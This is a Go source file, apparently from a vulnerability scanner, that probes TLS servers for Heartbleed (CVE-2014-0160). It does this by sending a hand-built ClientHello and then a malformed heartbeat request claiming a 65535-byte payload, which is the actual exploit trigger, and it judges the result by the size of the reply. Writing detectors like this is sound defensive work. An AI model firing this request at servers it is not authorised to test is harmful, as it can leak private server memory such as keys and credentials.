package probes

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"io"
	"net"
	"time"
)

// HeartbleedStatus is the result of a Heartbleed (CVE-2014-0160) probe.
type HeartbleedStatus int

const (
	// HeartbleedSafe means the server did not return an oversized heartbeat
	// response, or does not support the heartbeat extension at all.
	HeartbleedSafe HeartbleedStatus = iota
	// HeartbleedVulnerable means the server returned a heartbeat response
	// larger than the payload we sent, indicating heap memory leakage.
	HeartbleedVulnerable
	// HeartbleedUnknown means the probe was inconclusive (TCP error, timeout,
	// or the server closed the connection before the handshake phase).
	HeartbleedUnknown
)

// ProbeHeartbleed tests whether the server at addr is vulnerable to Heartbleed
// (CVE-2014-0160) by sending a TLS Heartbeat request with a payload_length
// field much larger than the actual payload, then checking whether the server
// returns more bytes than were sent.
//
// Detection method (no zcrypto required):
//  1. Send a TLS 1.2 ClientHello advertising the Heartbeat extension.
//  2. Read server records until ServerHelloDone (without completing crypto).
//  3. Send a HeartbeatRequest with payload_length=65535 but 0 actual payload
//     bytes — the classic Heartbleed trigger.
//  4. If the server returns a HeartbeatResponse with > 3 bytes → vulnerable.
//
// Vulnerable OpenSSL versions (< 1.0.1g) process heartbeat messages before
// verifying MAC or completing key exchange, so sending the request in
// plaintext after ServerHelloDone is sufficient for detection.
func ProbeHeartbleed(ctx context.Context, addr string) (HeartbleedStatus, error) {
	d := net.Dialer{Timeout: 5 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return HeartbleedUnknown, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Step 1: ClientHello with Heartbeat extension.
	if _, err := conn.Write(craftClientHelloWithHeartbeat()); err != nil {
		return HeartbleedUnknown, err
	}

	// Step 2: Read records until ServerHelloDone (0x0E) or error.
	r := &tlsRecordReader{conn: conn}
	for {
		msgType, _, err := r.nextHandshake()
		if err != nil {
			// Alert or connection closed before ServerHelloDone → safe.
			return HeartbleedSafe, nil
		}
		if msgType == 0x0E { // ServerHelloDone
			break
		}
	}

	// Step 3: Send HeartbeatRequest with oversized payload_length.
	if _, err := conn.Write(craftHeartbeatRequest()); err != nil {
		return HeartbleedSafe, nil // can't reach server → treat as safe
	}

	// Step 4: Read the response record header.
	hdr := make([]byte, 5)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return HeartbleedSafe, nil // no response → not vulnerable
	}
	recordType := hdr[0]
	recordLen := binary.BigEndian.Uint16(hdr[3:5])

	// A HeartbeatResponse (0x18) with length > 3 means the server copied
	// memory beyond our (empty) payload — classic Heartbleed leak.
	if recordType == 0x18 && recordLen > 3 {
		return HeartbleedVulnerable, nil
	}
	return HeartbleedSafe, nil
}

// craftClientHelloWithHeartbeat builds a TLS 1.2 ClientHello that includes
// the Heartbeat extension (RFC 6520, type=15) with mode=peer_allowed_to_send.
func craftClientHelloWithHeartbeat() []byte {
	var body []byte
	// client_version: TLS 1.2
	body = append(body, 0x03, 0x03)
	// random (32 bytes)
	random := make([]byte, 32)
	_, _ = rand.Read(random)
	body = append(body, random...)
	// session_id: empty
	body = append(body, 0x00)
	// cipher_suites
	suites := []uint16{
		0xC02F, // TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
		0xC02B, // TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
		0x009C, // TLS_RSA_WITH_AES_128_GCM_SHA256
		0x002F, // TLS_RSA_WITH_AES_128_CBC_SHA
		0x000A, // TLS_RSA_WITH_3DES_EDE_CBC_SHA
		0x00FF, // TLS_EMPTY_RENEGOTIATION_INFO_SCSV
	}
	body = binary.BigEndian.AppendUint16(body, uint16(len(suites)*2))
	for _, s := range suites {
		body = binary.BigEndian.AppendUint16(body, s)
	}
	// compression: null only
	body = append(body, 0x01, 0x00)
	// extensions: only Heartbeat (type=0x000F, peer_allowed_to_send=0x01)
	ext := []byte{
		0x00, 0x0F, // extension type = Heartbeat
		0x00, 0x01, // extension data length = 1
		0x01,       // HeartbeatMode = peer_allowed_to_send
	}
	body = binary.BigEndian.AppendUint16(body, uint16(len(ext)))
	body = append(body, ext...)

	// Handshake message: ClientHello (0x01) + 3-byte length
	var hs []byte
	hs = append(hs, 0x01)
	hs = append(hs, byte(len(body)>>16), byte(len(body)>>8), byte(len(body)))
	hs = append(hs, body...)

	// TLS record: Handshake (0x16), version 0x0301, 2-byte length
	var rec []byte
	rec = append(rec, 0x16, 0x03, 0x01)
	rec = binary.BigEndian.AppendUint16(rec, uint16(len(hs)))
	rec = append(rec, hs...)
	return rec
}

// craftHeartbeatRequest builds a plaintext TLS Heartbeat request (RFC 6520)
// with payload_length=65535 but zero actual payload bytes.
//
// Record layout:
//
//	0x18        — content type: Heartbeat
//	0x03, 0x02  — version: TLS 1.1 (common in Heartbleed PoCs)
//	0x00, 0x03  — record length: 3 bytes
//	0x01        — HeartbeatMessageType: request
//	0xFF, 0xFF  — payload_length: 65535 (actual payload is 0 bytes)
func craftHeartbeatRequest() []byte {
	return []byte{
		0x18, 0x03, 0x02, // Heartbeat record, TLS 1.1
		0x00, 0x03,       // record length = 3
		0x01,             // HeartbeatMessageType = request
		0xFF, 0xFF,       // payload_length = 65535 (triggers Heartbleed)
	}
}
